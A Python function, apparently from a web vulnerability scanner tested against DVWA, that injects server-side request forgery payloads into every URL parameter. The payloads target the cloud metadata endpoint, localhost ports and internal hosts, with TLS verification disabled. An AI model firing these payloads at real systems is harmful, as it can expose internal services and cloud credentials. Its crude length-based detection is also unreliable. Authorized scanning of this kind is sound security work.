import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def scan_ssrf(target):
    results = []
    parsed = urlparse(target)
    params = parse_qs(parsed.query)

    # DVWA-friendly fallback for SSRF-style pages.
    if not params and "ssrf" in parsed.path.lower():
        params = {"url": ["http://127.0.0.1"]}
    
    if not params:
        return {"vulnerable": False, "details": []}
    
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080",
        "http://127.0.0.1:22",
        "http://internal-api:8000"
    ]
    
    for param_name in params:
        for payload in payloads:
            try:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = urlunparse((
                    "http", parsed.netloc, parsed.path,
                    parsed.params, urlencode(test_params, doseq=True), parsed.fragment
                ))
                
                res = requests.get(test_url, timeout=3, verify=False)
                
                # Check if response indicates internal resource access
                if res.status_code == 200 and len(res.text) > 50:
                    results.append({
                        "type": "SSRF",
                        "severity": "HIGH",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "description": "Server-Side Request Forgery vulnerability detected"
                    })
            except Exception as e:
                pass
    
    return {"vulnerable": bool(results), "details": results}